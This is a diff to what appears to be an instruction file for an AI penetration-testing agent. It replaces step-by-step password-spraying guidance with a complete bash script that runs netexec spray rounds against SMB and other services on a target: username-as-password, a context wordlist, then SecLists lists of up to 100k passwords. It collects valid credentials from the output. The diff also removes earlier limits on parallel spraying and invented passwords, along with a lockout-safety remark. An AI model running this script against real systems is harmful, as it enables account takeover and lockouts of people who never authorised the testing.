@@ -292,67 +292,125 @@ SecLists file is appended.**
 2. `engagement/evidence/wordlist.txt`
 3. Operator-provided wordlist path
 
-## Spray Execution
+## Spray Execution — Script-Based
 
-**Sequential. One service at a time. One spray round at a time.**
+**Generate a self-contained spray script, then execute it in one shot.**
 
-The orchestrator specifies which services to spray (from the operator's
-selection). Spray each service in the order listed. Complete ALL rounds on
-one service before moving to the next.
+The Bash tool has a 2-minute timeout. Large spray rounds (500+ passwords × 8+
+users) exceed this, causing the command to move to background and forcing the
+agent to poll with sleep/wait/ps — wasting ~50% of total spray time on overhead.
 
-**Do NOT:**
-- Run multiple spray commands in parallel or as background tasks
-- Spray the same password list on multiple services simultaneously
-- Skip ahead to SecLists before completing wordlist.txt
-- Invent passwords not in the wordlist files
+**The fix:** Generate a bash script with all spray rounds baked in, then execute
+it via `start_process` (persistent PTY, no timeout). The script runs all rounds
+sequentially within one process, outputs structured results, and exits.
 
-### Round 1: Username-as-Password (per service)
+### Step 1: Generate the Spray Script
 
-Use the usernames file as both the user list and the password list:
-
-```bash
-nxc smb TARGET -u engagement/evidence/usernames.txt \
-  -p engagement/evidence/usernames.txt \
-  --continue-on-success -d DOMAIN
-```
-
-This tests every username as a password against every user (N×N attempts).
-For typical user lists (<20 users), this is well within safe lockout bounds
-and catches cases where users set another user's name as their password.
-
-**If any hit is found:** Record it, note which user/password, and continue
-spraying remaining rounds (other users may also have weak passwords).
-
-### Round 2: wordlist.txt (per service)
-
-Standard spray — every password tested against all users:
+Write `engagement/evidence/spray-runner.sh` using the Write tool. The script
+takes no arguments — all values are embedded from the context the orchestrator
+provided.
 
 ```bash
-nxc smb TARGET -u engagement/evidence/usernames.txt \
-  -p engagement/evidence/wordlist.txt \
-  --continue-on-success -d DOMAIN
+#!/usr/bin/env bash
+set -euo pipefail
+
+# === Configuration (agent fills these from orchestrator context) ===
+TARGET="TARGET_IP"
+DOMAIN="DOMAIN.LOCAL"
+USERFILE="engagement/evidence/usernames.txt"
+WORDLIST="engagement/evidence/wordlist.txt"
+RESULTS="engagement/evidence/spray-results.txt"
+
+# SecLists file (tier-dependent)
+# Light:  /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
+# Medium: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+# Heavy:  /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
+SECLISTS_FILE="SECLISTS_PATH"
+
+# Services to spray (from operator selection)
+SERVICES=(smb)  # e.g., (smb winrm ldap ssh mssql rdp)
+
+# === Spray Execution ===
+> "$RESULTS"  # truncate results file
+
+for svc in "${SERVICES[@]}"; do
+    echo "========================================" | tee -a "$RESULTS"
+    echo "[*] Service: $svc" | tee -a "$RESULTS"
+    echo "========================================" | tee -a "$RESULTS"
+
+    # Round 1: Username-as-password
+    echo "[*] Round 1: username-as-password" | tee -a "$RESULTS"
+    nxc "$svc" "$TARGET" -u "$USERFILE" -p "$USERFILE" \
+        --continue-on-success -d "$DOMAIN" 2>&1 | tee -a "$RESULTS"
+    echo "" | tee -a "$RESULTS"
+
+    # Round 2: Context wordlist
+    echo "[*] Round 2: context wordlist" | tee -a "$RESULTS"
+    nxc "$svc" "$TARGET" -u "$USERFILE" -p "$WORDLIST" \
+        --continue-on-success -d "$DOMAIN" 2>&1 | tee -a "$RESULTS"
+    echo "" | tee -a "$RESULTS"
+
+    # Round 3: SecLists wordlist
+    if [[ -f "$SECLISTS_FILE" ]]; then
+        echo "[*] Round 3: SecLists ($SECLISTS_FILE)" | tee -a "$RESULTS"
+        nxc "$svc" "$TARGET" -u "$USERFILE" -p "$SECLISTS_FILE" \
+            --continue-on-success -d "$DOMAIN" 2>&1 | tee -a "$RESULTS"
+        echo "" | tee -a "$RESULTS"
+    else
+        echo "[!] SecLists file not found: $SECLISTS_FILE" | tee -a "$RESULTS"
+    fi
+done
+
+echo "========================================" | tee -a "$RESULTS"
+echo "[*] Spray complete" | tee -a "$RESULTS"
+
+# Extract hits (lines containing [+] or "Pwn3d")
+echo "" | tee -a "$RESULTS"
+echo "=== VALID CREDENTIALS ===" | tee -a "$RESULTS"
+grep -E '(\[\+\]|Pwn3d)' "$RESULTS" 2>/dev/null || echo "(none found)" | tee -a "$RESULTS"
 ```
 
-### Round 3: SecLists Wordlist (per service, tier-dependent)
+**Agent responsibilities when generating the script:**
 
-Same approach, pointing to the tier-appropriate SecLists file:
+1. Replace `TARGET_IP`, `DOMAIN.LOCAL`, and `SECLISTS_PATH` with real values
+2. Set the `SERVICES` array to match operator-selected services
+3. For hydra-only protocols (FTP, HTTP POST form), add hydra commands instead
+   of nxc (see Service Protocol Commands below)
+4. Write the script via the Write tool, then `chmod +x`
 
-```bash
-# Light tier
-nxc smb TARGET -u engagement/evidence/usernames.txt \
-  -p /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt \
-  --continue-on-success -d DOMAIN
+### Step 2: Execute via start_process
 
-# Medium tier
-nxc smb TARGET -u engagement/evidence/usernames.txt \
-  -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
-  --continue-on-success -d DOMAIN
+Run the script in a persistent PTY session — no Bash timeout issues:
 
-# Heavy tier
-nxc smb TARGET -u engagement/evidence/usernames.txt \
-  -p /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt \
-  --continue-on-success -d DOMAIN
 ```
+start_process(command="bash engagement/evidence/spray-runner.sh", label="spray-runner")
+```
+
+Then monitor output with `read_output(session_id=...)` until the script
+prints `[*] Spray complete`. Use `send_command(session_id=..., command="")`
+if needed to check for new output.
+
+### Step 3: Parse Results
+
+After the script completes:
+
+1. Read `engagement/evidence/spray-results.txt` for the full output
+2. Extract valid credentials from the `=== VALID CREDENTIALS ===` section
+3. Close the session: `close_session(session_id=..., save_transcript=true)`
+4. Include all findings in your return summary
+
+### Spray Rounds Reference
+
+The script above embeds three rounds per service. For reference, the rounds are:
+
+**Round 1: Username-as-password** — usernames file as both user and password
+list (N×N attempts). Catches users who set another user's name as password.
+
+**Round 2: Context wordlist** — `engagement/evidence/wordlist.txt` with
+domain/hostname/seasonal derivatives (see wordlist.txt section above).
+
+**Round 3: SecLists** — tier-dependent external wordlist (500/10k/100k
+passwords).
 
 ### Service Protocol Commands
 
